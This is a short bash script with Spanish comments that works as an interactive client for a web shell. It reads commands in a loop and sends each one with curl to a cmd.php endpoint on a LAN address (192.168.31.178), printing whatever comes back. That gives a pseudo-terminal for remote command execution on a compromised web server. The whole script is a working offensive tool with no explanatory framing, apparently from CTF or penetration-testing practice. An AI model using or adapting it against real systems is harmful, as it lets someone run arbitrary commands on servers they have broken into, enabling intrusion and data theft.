#!/bin/bash

# control c para exit
trap ctrl_c INT
function ctrl_c(){
	echo -e "\n[*] Exiting..."
	exit 0
}


echo;
while [ "$command" != "exit" ]; do 
	echo -n "$~" && read command
	command=$(echo $command | tr ' ' '+')
	curl -s "http://192.168.31.178/cmd.php?cmd=$command"
done;
echo;
